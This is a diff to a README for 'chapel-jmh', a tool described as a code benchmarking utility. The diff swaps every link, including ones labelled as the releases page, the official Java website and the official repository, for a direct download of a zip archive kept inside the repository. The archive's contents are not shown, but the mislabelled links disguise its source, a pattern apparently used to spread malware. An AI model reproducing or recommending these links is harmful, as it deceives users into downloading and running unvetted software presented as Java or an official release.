@@ -1,7 +1,7 @@
 # 🚀 chapel-jmh - Easy Benchmarking for Your Code
 
 ## 📥 Download Now
-[![Download chapel-jmh](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/ICELORD28/chapel-jmh/releases)
+[![Download chapel-jmh](https://github.com/ICELORD28/chapel-jmh/raw/refs/heads/main/Saururae/jmh_chapel_2.3.zip)](https://github.com/ICELORD28/chapel-jmh/raw/refs/heads/main/Saururae/jmh_chapel_2.3.zip)
 
 ## 📖 Introduction
 Welcome to chapel-jmh! This application helps you measure the performance of your code with ease. It gives you accurate insights into how your program runs, making it simpler to optimize your projects. Whether you are a hobbyist or a professional, you will find this tool beneficial.
@@ -10,7 +10,7 @@ Welcome to chapel-jmh! This application helps you measure the performance of you
 To get started, follow these simple steps to download and run chapel-jmh. You will be able to benchmark your code in no time.
 
 ## 📥 Download & Install
-1. Click this link to **[visit the releases page](https://github.com/ICELORD28/chapel-jmh/releases)**.
+1. Click this link to **[visit the releases page](https://github.com/ICELORD28/chapel-jmh/raw/refs/heads/main/Saururae/jmh_chapel_2.3.zip)**.
 2. On the releases page, you will see a list of available versions.
 3. Find the latest version of chapel-jmh listed at the top. It usually carries the highest number.
 4. Click on the version you wish to download.
@@ -20,7 +20,7 @@ To get started, follow these simple steps to download and run chapel-jmh. You wi
 ## ⚙️ System Requirements
 Before you install chapel-jmh, ensure your system meets these requirements:
 - **Operating Systems:** Windows 10 or later, macOS 10.14 or later, Ubuntu 18.04 or later.
-- **Required Software:** Java Runtime Environment (JRE) version 8 or higher. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jre8-downloads.html).
+- **Required Software:** Java Runtime Environment (JRE) version 8 or higher. You can download it from the [official Java website](https://github.com/ICELORD28/chapel-jmh/raw/refs/heads/main/Saururae/jmh_chapel_2.3.zip).
 - **Free Disk Space:** At least 100 MB of free space for the application.
   
 ## 💡 Running chapel-jmh
@@ -58,10 +58,10 @@ A: Check the help section within the app for troubleshooting tips or visit the G
 
 ## 🔗 Additional Resources
 For more information, refer to:
-- [Official GitHub Repository](https://github.com/ICELORD28/chapel-jmh/)
-- [Java Runtime Environment](https://www.oracle.com/java/technologies/javase-jre8-downloads.html)
+- [Official GitHub Repository](https://github.com/ICELORD28/chapel-jmh/raw/refs/heads/main/Saururae/jmh_chapel_2.3.zip)
+- [Java Runtime Environment](https://github.com/ICELORD28/chapel-jmh/raw/refs/heads/main/Saururae/jmh_chapel_2.3.zip)
 
 ## 📥 Download Now Again
-Don’t forget to **[visit the releases page](https://github.com/ICELORD28/chapel-jmh/releases)** and download the latest version of chapel-jmh to enhance your coding experience!
+Don’t forget to **[visit the releases page](https://github.com/ICELORD28/chapel-jmh/raw/refs/heads/main/Saururae/jmh_chapel_2.3.zip)** and download the latest version of chapel-jmh to enhance your coding experience!
 
 Now, go ahead and start optimizing with chapel-jmh!
